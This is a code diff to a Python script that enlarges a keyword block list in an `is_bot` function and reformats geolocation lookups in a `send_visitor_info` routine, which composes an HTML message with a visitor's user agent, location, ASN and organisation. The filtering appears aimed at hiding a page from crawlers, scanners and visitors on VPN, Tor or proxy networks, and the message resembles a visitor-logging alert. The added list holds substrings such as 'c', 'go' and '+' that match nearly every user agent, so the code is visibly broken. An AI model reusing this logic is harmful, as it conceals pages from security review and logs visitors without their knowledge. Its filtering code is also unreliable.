@@ -178,11 +178,61 @@ def is_bot(ip, user_agent):
         "pinterest",
         "linkedin",
         "twitter",
+        "+",
+        ".com",
+        ".net",
+        ".org",
+        ".edu",
+        ".gov",
+        ".mil",
+        ".int",
+        ".ac",
+        ".ad",
+        "software",
+        "bot",
+        "crawler",
+        "spider",
+        "scraper",
+        "monitor",
+        "analytics",
+        "tracking",
+        "monitoring",
+        "probing",
+        "scanning",
+        "go",
+        "python",
+        "java",
+        "javascript",
+        "php",
+        "ruby",
+        "swift",
+        "kotlin",
+        "csharp",
+        "c",
+        "http",
+        "cloud",
+        "https",
+        "ftp",
+        "smtp",
+        "imap",
+        "pop",
+        "nntp",
+        "telnet",
+        "ssh",
+        "vpn",
+        "proxy",
+        "tor",
+        "ss",
+        "ssr",
+        "v2ray",
+        "trojan",
+        "wireguard",
     ]
     if any(org in user_agent.lower() for org in blocked_organizations):
         return True
     try:
-        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
+        response = requests.get(
+            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
         geo_data = response.json()
         if "organization" in geo_data and any(
             org in geo_data["organization"].lower() for org in blocked_organizations
@@ -197,7 +247,8 @@ def is_bot(ip, user_agent):
 def send_visitor_info(ip, user_agent):
     ip = ip.strip().replace("/", "").replace("\\", "").strip()
     try:
-        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
+        response = requests.get(
+            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
         geo_data = response.json()
     except (RequestException, JSONDecodeError) as e:
         print(f"Error fetching geo data: {e}")
@@ -218,7 +269,8 @@ def send_visitor_info(ip, user_agent):
     longitude = escape_html(str(geo_data.get("longitude", DEFAULT_VALUE)))
     timezone = escape_html(str(geo_data.get("timezone", DEFAULT_VALUE)))
     asn = escape_html(str(geo_data.get("asn", DEFAULT_VALUE)))
-    organization = escape_html(str(geo_data.get("organization", DEFAULT_VALUE)))
+    organization = escape_html(
+        str(geo_data.get("organization", DEFAULT_VALUE)))
 
     message = f"""
 <b>🖥️ User Agent:</b> <code>{user_agent}</code>
